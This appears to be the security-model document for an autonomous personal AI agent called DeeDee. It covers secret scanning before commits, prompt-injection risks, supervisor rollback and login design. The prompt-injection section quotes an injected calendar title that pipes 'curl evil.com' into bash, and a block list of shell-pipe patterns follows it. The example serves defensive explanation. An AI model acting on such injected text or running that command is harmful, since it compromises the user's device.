# Security Model 🛡️

DeeDee operates on a **"YOLO but Safe"** model. This means we prioritize **Personal Capability** over enterprise-grade restriction, but with specific guardrails to prevent catastrophic errors or malicious remote manipulation.

## Threat Model

### 1. Repository Leakage
**Risk**: The agent autonomously commits code containing API Keys (`sk-...`, `AIza...`, `ghp_...`).
**Mitigation**:
- **Pre-Commit Scan**: `GitOps.commitAndPush` scans all changed files for regex patterns matching known secrets.
- **Abort**: If a secret is found, the commit is completely blocked.
- **No `git add .`**: tracked changes are staged with `git add -u`. Untracked files are staged one by one, and only when they live under `apps/`, `packages/`, `docs/`, `specs/` or `.github/` with a code or doc extension (`.js .jsx .ts .json .md .yml .yaml .py .txt`). Root-level files, `data/` and `*.db` never get staged. Skipped files are logged and returned as `skipped` in the result. This keeps personal files the agent drops into its work dir out of the public repo.

### 2. Remote Code Execution (RCE) via Prompt Injection
**Risk**: An attacker sends a calendar invite or email with a title like `Meeting | curl evil.com | bash`. If the agent processes this text into a shell command, the device is compromised.
**Mitigation**:
- **Confirmation Manager**:
    - **Blocked**: `| bash`, `| sh`, `| python`, `| node`.
    - **Allowed**: `curl`, `wget`, `ls`, `grep` (Standard tools are fine).
- **Untrusted Sources**: (Future) Inputs from Email/Calendar will be tagged as "Untrusted" and prevented from triggering specific tools.

### 3. Logic Failure
**Risk**: The agent pushes an update that runs (no crash) but is logically broken (e.g. infinite loop, or always returns empty text).
**Mitigation**:
- **Supervisor Integration Tests**:
    - Every hour, the Supervisor sends a `POST /v1/chat` request (`HEALTH_CHECK_PING_123`) to the Agent.
    - If the Agent does not reply with a correct confirmation, the Supervisor rolls back the code.
- **Self-healing rollback (self-commits only)**:
    - On start the Supervisor compares `HEAD` with `.last_boot_commit` and reads the author email of `HEAD`.
    - The 10-minute rollback window opens only when `HEAD` is new since the last boot AND its author is the Supervisor's own git email (`GIT_USER_EMAIL`, default `supervisor@deedee.bot`).
    - Any other start (reboot, crash, Balena deploy, owner merge) keeps the window closed. The Supervisor still alerts on Slack, but never reverts.
    - Before reverting, `GitOps.rollback` checks that `HEAD` is still the self-commit hash recorded at start. If `HEAD` moved, it aborts and logs.
    - `SUPERVISOR_AUTO_ROLLBACK=false` turns rollback off entirely. Alerts stay on.

## Access Control

### Filesystem
- **Read/Write**: `/app/source` (The repo itself).
- **Read/Write**: `/app/data` (Persistent DBs).
- **Read-Only**: `/proc`, `/sys`.

### Network
- **Outbound**: Unrestricted (needed for API calls, fetch).
- **Inbound**: None (container isolation).
- **Service Mesh**:
    - **`apps/web`**: Public UI. Browser-facing auth handled by the built-in `/login` page (password + passkey, signed JWT cookie). See **User Authentication** below.
    - **`apps/api`**: Public Gateway. `/v1/*` enforces Bearer Auth (`DEEDEE_API_TOKEN`). `/socket.io` verifies the session JWT cookie issued by `apps/web` (shared `SESSION_SECRET`).
    - **`apps/agent`**: Internal Only. Protected by Docker Network isolation **plus** `DEEDEE_INTERNAL_TOKEN` on `/internal/*` (defense-in-depth so accidental port exposure doesn't leak vault files / wardrobe images / journal data). Enforces Path Validation on Journal Ops.
    - **`apps/supervisor`**: Internal Only. Protected by `SUPERVISOR_TOKEN` to prevent SSRF->RCE lateral movement.

## User Authentication

DeeDee is single-user. Browser sessions are gated by a self-contained `/login` page; no reverse-proxy forward-auth required.

- **Password**: scrypt hash (N=32768, r=8, p=1) stored in `data/auth.json` on the `web-data` Docker volume. Set via `LOGIN_PASSWORD` env var (idempotent on every boot — also acts as the recovery path) or `npm run auth:init`.
- **Passkeys (WebAuthn)**: Optional. Self-service enrollment at `/settings/security`. Requires `WEBAUTHN_RP_ID` + HTTPS `WEBAUTHN_ORIGIN`. Disabled automatically on plain HTTP except `localhost`.
- **Sessions**: Signed JWT (HS256 + `SESSION_SECRET`) in an `httpOnly; Secure; SameSite=Lax` cookie. 30-day TTL with sliding refresh — re-issued on the next authenticated request once the token is past half-life, so weekly use never requires re-login.
- **Logout**: Clears the cookie and adds the JTI to the revocation list in `auth.json`. Rotate `SESSION_SECRET` to invalidate all outstanding sessions.
- **Rate limit**: `/api/auth/login` and `/api/auth/passkey/login/*` are capped at 5 attempts per 15 minutes per IP.
- **Cross-subdomain (two-subdomain deploy)**: Set `COOKIE_DOMAIN=.example.com` so the cookie rides to `api.example.com` for socket.io. WebAuthn RP ID stays scoped to the UI subdomain.
- **Backups**: `web-data` (containing `auth.json`) is **excluded from the backup recipe**. Recovery is "set `LOGIN_PASSWORD` again, restart web, re-enroll passkeys" — safer than backing up the password hash and credential public keys.

For the env-var inventory and two-subdomain vs single-subdomain recipes, see the [Authentication Setup](../README.md#-authentication-setup) section in the README.

### Tools
- **GSuite**: Full Read/Write access to Calendar and Mail.
- **Home Assistant**: Full Control (lights, locks, etc). *Specific critical actions (unlock, disarm) require confirmation.*
